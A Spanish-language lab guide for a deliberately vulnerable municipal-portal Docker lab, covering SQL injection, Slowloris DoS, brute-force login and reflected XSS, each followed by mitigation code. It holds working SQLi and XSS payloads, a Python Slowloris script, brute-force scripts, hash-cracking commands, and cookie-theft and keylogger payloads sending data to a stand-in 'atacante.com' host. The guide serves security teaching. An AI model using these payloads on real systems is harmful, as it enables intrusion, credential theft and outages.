# 🔐 GUÍA DE LABORATORIO — OWASP Top 10
## Laboratorio de Pentesting y Mitigación — Portal Municipal Simulado (SAT-LAB)

---

> **⚠ AVISO LEGAL Y ÉTICO**  
> Este laboratorio opera en un entorno completamente aislado y controlado. Todas las vulnerabilidades son **intencionales** y tienen propósito exclusivamente educativo. **Está prohibido replicar estas técnicas en sistemas reales sin autorización escrita**. El uso indebido de estas técnicas constituye un delito informático según la legislación vigente.

---

## 📋 Información del Entorno

| Parámetro | Valor |
|-----------|-------|
| URL del portal | `http://localhost:8080` |
| Base de datos | `sat_lab` (MySQL 5.7) |
| Usuario BD (app) | `appuser` / `apppassword` |
| Puerto MySQL (expuesto) | `3306` |
| Red Docker | `sat_lab_network` (interna) |

### Credenciales de prueba

| Identificador (email) | Contraseña | Hash MD5 |
|-----------------------|-----------|----------|
| `72345678` | `123456` | `e10adc3949ba59abbe56e057f20f883e` |
| `45678912` | `admin` | `21232f297a57a5a743894a0e4a801fc3` |
| `31290456` | `piura2026` | `a0b9aab58ee2e1f413fa99c25adc8f5a` |
| `86541230` | `password` | `5f4dcc3b5aa765d61d8327deb882cf99` |
| `10293847` | `qwerty` | `d8578edf8458ce06fbc5bb76a58c5ca4` |

### Comandos de Gestión del Entorno Docker

```bash
# Levantar el laboratorio (primera vez)
docker compose up -d --build

# Ver estado de los contenedores
docker compose ps

# Ver logs del servidor web
docker compose logs -f web

# Acceder al shell del contenedor web
docker exec -it sat_web bash

# Acceder a MySQL dentro del contenedor
docker exec -it sat_db mysql -u appuser -papppassword sat_lab

# Detener el laboratorio
docker compose down

# Resetear completamente (borra datos de BD)
docker compose down -v && docker compose up -d --build
```

---

---

## 👤 Estudiante 1 — Inyección SQL en Consulta de Deudas (V1)

**Archivo objetivo:** `http://localhost:8080/consulta.php`  
**Tipo de ataque:** SQL Injection — UNION Based  
**OWASP:** A03:2021 – Injection  
**CVE relacionado:** CWE-89

---

### 🔍 Fase 1: Reconocimiento

**Objetivo:** Identificar parámetros de entrada y confirmar la ausencia de sanitización.

**1.1 Observar el formulario en el portal:**  
Abrir `http://localhost:8080` → Sección "Consulta de Deudas".  
El formulario usa método `POST` y envía el campo `id_contribuyente` al script `consulta.php`.

**1.2 Confirmar que la consulta SQL se muestra en pantalla:**  
Ingresar el valor `72345678` → Observar que la página muestra:
```
Debug SQL: SELECT id_contribuyente, concepto... WHERE id_contribuyente = '72345678'
```
> ✅ **Hallazgo:** La consulta SQL es visible. Esto confirma concatenación directa y facilita enormemente la explotación.

**1.3 Detección de parámetros mediante fuzzing manual:**  
Ingresar una comilla simple (`'`) y presionar "Consultar Deudas".  
Si el servidor devuelve un error SQL, el parámetro es inyectable.

```
Input: '
Respuesta esperada: Error SQL: You have an error in your SQL syntax...
```

**1.4 Detección automatizada con sqlmap (opcional):**
```bash
# Capturar la petición POST con Burp Suite y guardarla como request.txt
# Luego ejecutar sqlmap contra ella:
sqlmap -r request.txt --dbs --batch --level=3

# Alternativa directa:
sqlmap -u "http://localhost:8080/consulta.php" \
       --data="id_contribuyente=72345678" \
       --dbs --batch --dbms=mysql
```

---

### 💥 Fase 2: Explotación — UNION Based SQLi

**2.1 Determinar el número de columnas (ORDER BY):**
```
72345678' ORDER BY 1-- -   → Resultado: OK (sin error)
72345678' ORDER BY 2-- -   → Resultado: OK
72345678' ORDER BY 3-- -   → Resultado: OK
72345678' ORDER BY 4-- -   → Resultado: OK
72345678' ORDER BY 5-- -   → Resultado: OK
72345678' ORDER BY 6-- -   → Resultado: ERROR ← confirma 5 columnas
```

**2.2 Identificar columnas visibles con UNION SELECT:**
```sql
72345678' UNION SELECT 'COL1','COL2','COL3','COL4','COL5'-- -
```
Observar qué columnas aparecen en la tabla de resultados.

**2.3 Extraer datos de la tabla `usuarios`:**
```sql
-1' UNION SELECT id,email,password,'PENDIENTE','2099-01-01' FROM usuarios-- -
```
> ✅ **Resultado esperado:** La tabla mostrará los emails y hashes MD5 de todos los usuarios del sistema.

**2.4 Extraer todos los registros en una sola fila (GROUP_CONCAT):**
```sql
-1' UNION SELECT 1,GROUP_CONCAT(email SEPARATOR ' | '),GROUP_CONCAT(password SEPARATOR ' | '),'VENCIDA','2099-01-01' FROM usuarios-- -
```

**2.5 Listar todas las tablas de la base de datos:**
```sql
-1' UNION SELECT 1,table_name,'','','2099-01-01' FROM information_schema.tables WHERE table_schema='sat_lab'-- -
```

**2.6 Verificar la versión de MySQL:**
```sql
-1' UNION SELECT 1,@@version,@@datadir,'','2099-01-01'-- -
```

---

### 🔓 Fase 3: Crackear los hashes MD5 extraídos

Una vez obtenidos los hashes, usar herramientas de crackeo:

```bash
# Con hashcat (modo MD5 = -m 0):
echo "e10adc3949ba59abbe56e057f20f883e" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Con john:
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Con tablas rainbow online (no recomendado en entornos reales):
# md5.gromweb.com | hashes.com | crackstation.net
```
> ✅ `e10adc3949ba59abbe56e057f20f883e` → contraseña: `123456`

---

### 🛡️ Fase 4: Mitigación — Sentencias Preparadas con PDO

**Archivo de solución:** `defensa/consulta_segura.php`

**¿Por qué funciona PDO?**

```php
// ❌ CÓDIGO VULNERABLE:
$sql = "SELECT ... WHERE id_contribuyente = '" . $_POST['id'] . "'";
// Con input ' UNION SELECT ... la consulta se rompe y ejecuta el UNION.

// ✅ CÓDIGO SEGURO:
$sql  = "SELECT ... WHERE id_contribuyente = ?";
$stmt = $pdo->prepare($sql);       // Estructura SQL fijada aquí
$stmt->execute([$_POST['id']]);    // Dato enviado como valor literal
```

**Concepto clave:** Con `prepare()`, el motor de base de datos compila la consulta SQL **antes** de recibir los datos del usuario. Cuando `execute()` envía el dato, el motor lo trata como un **string literal**, no como código SQL. La comilla `'` del payload es escapada automáticamente y el UNION no se ejecuta.

**Verificación:** Ingresar el payload en `consulta_segura.php`:
```
-1' UNION SELECT 1,email,password,'VENCIDA','2099-01-01' FROM usuarios-- -
```
**Resultado esperado:** "No se encontraron deudas" (el payload falla silenciosamente).

---

---

## 👤 Estudiante 2 — DoS por Agotamiento de Recursos (Slowloris - V2)

**Servicio objetivo:** `http://localhost:8080`  
**Tipo de ataque:** Denial of Service — Slowloris (HTTP Keep-Alive Exhaustion)  
**OWASP:** A05:2021 – Security Misconfiguration  
**CVE relacionado:** CWE-400 (Uncontrolled Resource Consumption)

---

### 🔍 Fase 1: Reconocimiento del Servidor Web

**1.1 Identificar la versión de Apache con Nmap:**
```bash
# Escaneo de versión de servicio en el puerto 8080:
nmap -sV -p 8080 localhost

# Resultado esperado:
# 8080/tcp open  http  Apache httpd 2.4.xx

# Escaneo con scripts NSE para obtener cabeceras HTTP:
nmap -sV -p 8080 --script http-headers,http-server-header localhost

# Detección de configuración de keepalive:
nmap -p 8080 --script http-methods localhost
```

**1.2 Verificar las cabeceras HTTP manualmente (ServerTokens Full):**
```bash
curl -I http://localhost:8080

# Resultado esperado (modo vulnerable):
# HTTP/1.1 200 OK
# Server: Apache/2.4.57 (Debian)    ← Versión exacta expuesta
# Keep-Alive: timeout=75, max=500    ← Timeout alto: vulnerable
# Connection: Keep-Alive
```

**1.3 Verificar el Timeout configurado:**
```bash
# Acceder al contenedor y ver configuración activa:
docker exec sat_web apachectl -t -D DUMP_RUN_CFG 2>/dev/null | grep -i timeout

# O revisar el archivo de configuración:
docker exec sat_web cat /etc/apache2/conf-available/lab.conf
```

> ✅ **Hallazgo:** Timeout de 600 segundos y KeepAliveTimeout de 75 segundos. Apache mantiene cada conexión abierta hasta 75s sin actividad. Con 500 conexiones simultáneas, el servidor puede saturarse.

---

### 💥 Fase 2: Ataque Slowloris

> **⚠ Solo ejecutar dentro de la red del laboratorio. Nunca contra sistemas en producción.**

**2.1 Instalar slowhttptest en Kali Linux / Ubuntu:**
```bash
sudo apt update && sudo apt install -y slowhttptest

# Verificar instalación:
slowhttptest -v
```

**2.2 Ejecutar el ataque Slowloris (cabeceras lentas):**
```bash
slowhttptest \
  -c 500 \         # 500 conexiones simultáneas
  -H \             # Modo Slowloris (slow headers)
  -i 10 \          # Intervalo de envío de headers parciales (segundos)
  -r 200 \         # Tasa de conexiones nuevas por segundo
  -t GET \         # Método HTTP a usar
  -u http://localhost:8080 \
  -x 60 \          # Duración del test (60 segundos)
  -p 5             # Umbral de tiempo para confirmar DoS (segundos)
```

**2.3 Verificar el impacto (desde otra terminal durante el ataque):**
```bash
# Intentar acceder al servidor:
curl -v --max-time 10 http://localhost:8080

# Si el servidor está saturado: Connection timed out / No response

# Ver conexiones activas en el contenedor:
docker exec sat_web ss -tn state ESTABLISHED | wc -l

# Ver logs de Apache:
docker compose logs -f web | grep -i "client"
```

**2.4 Script Python básico de demostración Slowloris:**
```python
#!/usr/bin/env python3
"""
Implementación educativa básica de Slowloris.
Solo para uso en laboratorio con autorización.
"""
import socket, time, random, threading

HOST  = "localhost"
PORT  = 8080
SOCKS = 150  # Número de sockets a mantener abiertos

def slowloris_attack():
    sockets = []
    # Abrir múltiples conexiones TCP
    for _ in range(SOCKS):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((HOST, PORT))
            # Enviar una cabecera HTTP incompleta (sin \r\n\r\n final)
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"User-Agent: Mozilla/5.0\r\n".encode())
            s.send(f"Accept-language: en-US,en\r\n".encode())
            sockets.append(s)
        except socket.error:
            pass

    print(f"[+] {len(sockets)} conexiones abiertas")

    # Mantener las conexiones vivas enviando headers parciales
    while True:
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
            except socket.error:
                sockets.remove(s)
        time.sleep(10)  # Esperar 10s antes de enviar otro header

if __name__ == "__main__":
    print(f"[*] Iniciando Slowloris contra {HOST}:{PORT}")
    slowloris_attack()
```

```bash
# Ejecutar:
python3 slowloris_demo.py
```

---

### 🛡️ Fase 3: Mitigación — mod_reqtimeout + Hardening

**Archivo de configuración:** `lamp/apache2_lab.conf` → Bloque B

**3.1 Activar mod_reqtimeout en el contenedor:**
```bash
# Acceder al contenedor:
docker exec -it sat_web bash

# Habilitar el módulo de protección:
a2enmod reqtimeout

# Agregar la directiva en la configuración:
cat >> /etc/apache2/conf-available/lab.conf << 'EOF'
<IfModule reqtimeout_module>
    RequestReadTimeout header=20-40,MinRate=500 body=20,MinRate=500
</IfModule>
EOF

# Verificar configuración:
apachectl configtest

# Reiniciar Apache:
service apache2 restart
```

**3.2 Directivas de hardening completas para aplicar:**
```apache
# Anti-Slowloris: timeout estricto
<IfModule reqtimeout_module>
    RequestReadTimeout header=20-40,MinRate=500 body=20,MinRate=500
</IfModule>

# Timeouts agresivos
Timeout 30
KeepAliveTimeout 5

# Ocultar versión (anti-reconocimiento)
ServerTokens Prod
ServerSignature Off

# Limitar tamaño de peticiones
LimitRequestBody 10485760

# Solo métodos necesarios
<Directory /var/www/html>
    <LimitExcept GET POST HEAD>
        deny from all
    </LimitExcept>
</Directory>
```

**3.3 Verificar la mitigación:**
```bash
# Después de aplicar la configuración segura, repetir el ataque:
slowhttptest -c 500 -H -i 10 -r 200 -t GET -u http://localhost:8080 -x 30 -p 5

# Si mod_reqtimeout está activo, Apache cerrará las conexiones lentas
# antes de que agoten el pool de Workers.

# Verificar cabeceras actualizadas:
curl -I http://localhost:8080
# Server: Apache  ← Sin versión (ServerTokens Prod aplicado)
```

---

---

## 👤 Estudiante 3 — Fuerza Bruta y SQLi en el Portal de Login (V3)

**Archivo objetivo:** `http://localhost:8080/login.php`  
**Tipo de ataque:** Brute Force + SQL Injection en Autenticación  
**OWASP:** A07:2021 – Auth Failures + A03:2021 – Injection  
**CVE relacionado:** CWE-307, CWE-89

---

### 🔍 Fase 1: Reconocimiento del Formulario

**1.1 Identificar campos del formulario con curl:**
```bash
# Obtener el código fuente del portal:
curl -s http://localhost:8080/index.html | grep -A5 "form-login"

# Resultado: action="login.php" method="POST"
# Campos: usuario, password
```

**1.2 Enviar una solicitud POST de prueba con curl:**
```bash
# Intento con credenciales incorrectas:
curl -X POST http://localhost:8080/login.php \
     -d "usuario=prueba&password=prueba" \
     -v 2>&1 | grep -E "< HTTP|Credenciales|Acceso"
```

**1.3 Verificar la ausencia de protecciones:**
```bash
# Múltiples intentos rápidos (Brute Force manual):
for i in 1 2 3 4 5; do
    curl -s -X POST http://localhost:8080/login.php \
         -d "usuario=test&password=wrong$i" | grep -o "Credenciales\|Acceso"
done
# Si responde instantáneamente sin delay: NO hay protección anti-brute-force
```

> ✅ **Hallazgo:** El servidor responde sin retardo. No hay CAPTCHA, no hay bloqueo por IP, no hay límite de intentos.

---

### 💥 Fase 2: Ataque de Fuerza Bruta con Hydra

**2.1 Crear los archivos de diccionario:**
```bash
# Diccionario de identificadores (DNIs simulados):
cat > ids.txt << 'EOF'
72345678
45678912
31290456
86541230
10293847
12345678
87654321
11111111
EOF

# Diccionario de contraseñas comunes:
cat > passwords.txt << 'EOF'
123456
admin
piura2026
password
qwerty
123456789
abc123
letmein
admin123
12345678
EOF
```

**2.2 Ataque con Hydra:**
```bash
# Identificar el texto que indica login FALLIDO:
# (observar la respuesta al ingresar credenciales incorrectas)
# → "Credenciales incorrectas"

hydra -L ids.txt -P passwords.txt \
      localhost \
      http-post-form \
      "/login.php:usuario=^USER^&password=^PASS^:Credenciales incorrectas" \
      -V -f -t 10

# Parámetros:
#   -L ids.txt       → Lista de usuarios
#   -P passwords.txt → Lista de contraseñas
#   -V               → Modo verbose (muestra cada intento)
#   -f               → Detener al primer match
#   -t 10            → 10 hilos paralelos
```

> ✅ **Resultado esperado:** `[80][http-post-form] host: localhost login: 72345678 password: 123456`

**2.3 Ataque de Fuerza Bruta con script Python personalizado:**
```python
#!/usr/bin/env python3
"""
Script de Brute Force educativo para login.php (sin delay, sin protección).
"""
import requests

URL = "http://localhost:8080/login.php"
IDS = ["72345678", "45678912", "31290456", "86541230", "10293847"]
PASSWORDS = ["123456", "admin", "piura2026", "password", "qwerty",
             "123456789", "abc123", "letmein"]

print(f"[*] Iniciando ataque de fuerza bruta a {URL}")
print(f"[*] {len(IDS)} usuarios × {len(PASSWORDS)} contraseñas = {len(IDS)*len(PASSWORDS)} intentos\n")

for usuario in IDS:
    for password in PASSWORDS:
        response = requests.post(URL, data={"usuario": usuario, "password": password})
        if "Acceso Concedido" in response.text or "LOGIN EXITOSO" in response.text:
            print(f"[✅ ÉXITO] Usuario: {usuario} | Contraseña: {password}")
            break
        else:
            print(f"[✗] {usuario}:{password} → fallido")
```

```bash
python3 brute_login.py
```

---

### 💥 Fase 3: Explotación por SQL Injection en Login

**3.1 Bypass de autenticación clásico:**  
En el campo "Usuario" del formulario en `http://localhost:8080`:

| Campo | Payload |
|-------|---------|
| Usuario | `' OR '1'='1' -- -` |
| Contraseña | `cualquier_cosa` |

**¿Qué ocurre internamente?**
```sql
-- Consulta original:
SELECT * FROM usuarios WHERE email = 'X' AND password = 'Y'

-- Con el payload inyectado:
SELECT * FROM usuarios WHERE email = '' OR '1'='1' -- -' AND password = 'cualquier_cosa'
--                                                  ↑ El resto queda comentado
-- '1'='1' siempre es TRUE → devuelve el primer usuario de la tabla
```

**3.2 Obtener un usuario específico:**
```
Usuario: 72345678' -- -
Contraseña: (cualquier cosa)
```

**3.3 Con curl (automatizable):**
```bash
curl -X POST http://localhost:8080/login.php \
     -d "usuario=' OR '1'='1' --+-&password=x" \
     -s | grep -o "LOGIN EXITOSO\|email.*</div>"
```

---

### 🛡️ Fase 4: Mitigación — PDO + Anti-Brute Force

**Archivo de solución:** `defensa/login_seguro.php`

**Mitigaciones implementadas:**

| Técnica | Código | Efecto |
|---------|--------|--------|
| Prepared Statements | `$pdo->prepare($sql)` | Elimina SQLi |
| `hash_equals()` | `hash_equals($hash_bd, md5($input))` | Anti-timing attack |
| `sleep(1)` | `sleep(1)` en fallo | Limita a 1 intento/seg |
| `session_regenerate_id()` | Tras login exitoso | Anti-session fixation |
| Validación de longitud | `strlen($user) < 8` | Rechaza inputs inválidos |

**Verificación de la mitigación:**
```bash
# 1. Probar SQLi en la versión segura:
curl -X POST http://localhost:8080/defensa/login_seguro.php \
     -d "usuario=' OR '1'='1' --+-&password=x" \
     -s | grep -o "Acceso Concedido\|Credenciales"
# Resultado esperado: "Credenciales incorrectas" (SQLi bloqueado)

# 2. Probar brute-force y observar el delay de 1 segundo:
time for i in {1..5}; do
    curl -s -X POST http://localhost:8080/defensa/login_seguro.php \
         -d "usuario=99999999&password=wrong" > /dev/null
done
# Tiempo esperado: ~5 segundos (1s por intento fallido)
```

**En producción, además agregar:**
```php
// Tabla de intentos en BD:
// INSERT INTO login_attempts (ip, timestamp) VALUES (?, NOW());
// SELECT COUNT(*) FROM login_attempts WHERE ip=? AND timestamp > DATE_SUB(NOW(), INTERVAL 15 MINUTE);
// Si count > 5 → bloquear la IP o exigir CAPTCHA
```

---

---

## 👤 Estudiante 4 — XSS Reflejado en el Buscador (V4)

**Archivo objetivo:** `http://localhost:8080/buscar.php`  
**Tipo de ataque:** Cross-Site Scripting Reflejado (Reflected XSS)  
**OWASP:** A03:2021 – Injection (XSS)  
**CVE relacionado:** CWE-79

---

### 🔍 Fase 1: Detección Manual de Falta de Sanitización

**1.1 Identificar el método y parámetro del buscador:**

El buscador en el portal usa método `GET`:
```
http://localhost:8080/buscar.php?q=[TU_INPUT_AQUÍ]
```

**1.2 Prueba de detección básica — caracteres especiales:**

Ingresar en el buscador o directamente en la URL:
```
http://localhost:8080/buscar.php?q=<b>TEXTO_NEGRITA</b>
```
> ✅ **Si el texto aparece en negrita:** El HTML es interpretado → el parámetro es vulnerable.  
> ✅ **Si aparece como texto plano `<b>TEXTO_NEGRITA</b>`:** Está correctamente codificado.

**1.3 Inspeccionar el código fuente para confirmar la inyección:**
```bash
# Ver el HTML generado por el servidor:
curl -s "http://localhost:8080/buscar.php?q=<b>TEST</b>"

# En la respuesta buscar si aparece el tag sin codificar:
# VULNERABLE: <div class='result-value'><b>TEST</b></div>
# SEGURO:     <div class='result-value'>&lt;b&gt;TEST&lt;/b&gt;</div>
```

**1.4 Verificar el parámetro en el atributo `value` del input:**
```bash
curl -s "http://localhost:8080/buscar.php?q=\"><script>alert(1)</script>"
# Si el HTML contiene: value=""><script>alert(1)</script>
# → Hay un segundo punto de inyección en el atributo del input
```

---

### 💥 Fase 2: Payloads de Prueba XSS

**2.1 Payload básico de Proof of Concept (PoC):**
```
http://localhost:8080/buscar.php?q=<script>alert('XSS-OK')</script>
```
> ✅ **Resultado:** El navegador ejecuta JavaScript y muestra el cuadro de alerta.  
> **Nota educativa:** Si el cuadro aparece, el sitio es vulnerable a XSS.

**2.2 Payloads alternativos (bypass de filtros básicos):**
```html
<!-- Sin etiqueta <script> (útil si el filtro bloquea la palabra "script") -->
<img src=x onerror="alert('XSS-img')">

<!-- SVG (no necesita comillas para el atributo) -->
<svg onload=alert('XSS-svg')>

<!-- Usando eventos de HTML: -->
<body onload=alert('XSS-body')>
<input onfocus=alert('XSS-focus') autofocus>

<!-- Codificado en HTML entities (bypass de filtros básicos): -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
```

**2.3 Payload de simulación de robo de cookies:**
```javascript
// Si hubiera una sesión activa, este payload exfiltraría la cookie:
// (en el laboratorio, document.cookie estará vacío o con el session ID)
http://localhost:8080/buscar.php?q=<script>document.location='http://atacante.com/log?c='+encodeURIComponent(document.cookie)</script>
```

**2.4 Payload de manipulación del DOM (defacement):**
```
http://localhost:8080/buscar.php?q=<script>document.body.innerHTML='<h1 style=color:red>Página Hackeada por XSS!</h1>'</script>
```

**2.5 Demostración con keylogger básico:**
```javascript
// Este payload captura las teclas que el usuario presiona:
<script>
document.onkeypress = function(e) {
    var img = new Image();
    img.src = 'http://atacante.com/log?k=' + encodeURIComponent(e.key);
};
</script>
```

**URL completa (codificada):**
```bash
# Codificar el payload en URL:
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))"
# Resultado: %3Cscript%3Ealert%281%29%3C%2Fscript%3E

curl -v "http://localhost:8080/buscar.php?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
```

---

### 🔬 Fase 3: Análisis del Código Fuente

**Comparación del código vulnerable vs seguro:**

```php
// ════════════════════════════════════════════════════════
// ❌ CÓDIGO VULNERABLE (buscar.php)
// ════════════════════════════════════════════════════════
echo $_GET['q'];
// Si q = <script>alert(1)</script>
// El navegador recibe exactamente: <script>alert(1)</script>
// Y LO EJECUTA como JavaScript.

// ════════════════════════════════════════════════════════
// ✅ CÓDIGO SEGURO (buscar_seguro.php)
// ════════════════════════════════════════════════════════
echo htmlspecialchars($_GET['q'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
// Si q = <script>alert(1)</script>
// El navegador recibe: &lt;script&gt;alert(1)&lt;/script&gt;
// Y lo MUESTRA como texto plano. No hay ejecución de JS.
```

**Tabla de conversiones de `htmlspecialchars()`:**

| Carácter | Entidad HTML | Significado |
|----------|-------------|-------------|
| `<`  | `&lt;`   | Abre una etiqueta HTML |
| `>`  | `&gt;`   | Cierra una etiqueta HTML |
| `"`  | `&quot;` | Comilla doble (cierra atributos) |
| `'`  | `&#039;` | Comilla simple (cierra atributos) |
| `&`  | `&amp;`  | Inicio de entidad HTML |

---

### 🛡️ Fase 4: Mitigación — htmlspecialchars() + CSP

**Archivo de solución:** `defensa/buscar_seguro.php`

**4.1 Función de sanitización correcta:**
```php
// ✅ OBLIGATORIO en TODA salida de datos hacia HTML:
$salida_segura = htmlspecialchars(
    $input_usuario,      // Dato a sanitizar
    ENT_QUOTES |         // Codifica ' y " (no solo ")
    ENT_HTML5,           // Estándar HTML5 (más completo)
    'UTF-8'              // Charset explícito (evita ataques de encoding)
);
echo $salida_segura;
```

**4.2 Content-Security-Policy como segunda capa de defensa:**
```php
// Agregar en el PHP antes de cualquier salida HTML:
header("Content-Security-Policy: default-src 'self'; script-src 'none';");

// Esto le dice al navegador:
// - Solo cargar recursos del mismo dominio ('self')
// - NO ejecutar ningún script JavaScript ('none')
// Aunque el XSS escape al htmlspecialchars, el navegador lo bloquea.
```

**4.3 Verificación de la mitigación:**
```bash
# Probar el payload en la versión segura:
curl -s "http://localhost:8080/defensa/buscar_seguro.php?q=<script>alert(1)</script>"

# El output debe contener las entidades codificadas, NO el script:
# &lt;script&gt;alert(1)&lt;/script&gt;
```

**4.4 Cuándo y dónde aplicar la codificación:**

> **Regla de oro:** Sanitizar la salida en el **contexto donde se va a usar**.

| Contexto de inserción | Función de PHP |
|----------------------|----------------|
| Dentro de HTML (body, atributos) | `htmlspecialchars()` |
| Dentro de JavaScript | `json_encode()` + `htmlspecialchars()` |
| Dentro de una URL | `urlencode()` |
| Dentro de CSS | Evitar. Usar clases predefinidas. |
| En respuestas JSON (API) | `json_encode()` con `JSON_HEX_TAG` |

---

---

## 📊 Resumen del Laboratorio

| Vector | Estudiante | Vulnerabilidad | Archivo Vulnerable | Archivo Seguro |
|--------|------------|----------------|-------------------|----------------|
| V1 | E1 | SQL Injection UNION Based | `consulta.php` | `defensa/consulta_segura.php` |
| V2 | E2 | DoS Slowloris | `apache2_lab.conf` Bloque A | `apache2_lab.conf` Bloque B |
| V3 | E3 | Brute Force + SQLi Login | `login.php` | `defensa/login_seguro.php` |
| V4 | E4 | XSS Reflejado | `buscar.php` | `defensa/buscar_seguro.php` |

---

## 🧹 Limpieza del Entorno

```bash
# Detener contenedores y eliminar red:
docker compose down

# Eliminar contenedores, red Y volúmenes de datos:
docker compose down -v

# Verificar limpieza completa:
docker ps -a | grep sat_
docker volume ls | grep sat_
docker network ls | grep sat_
```

---

*Laboratorio creado con fines exclusivamente educativos. Prohibido su uso fuera de entornos controlados y autorizados.*
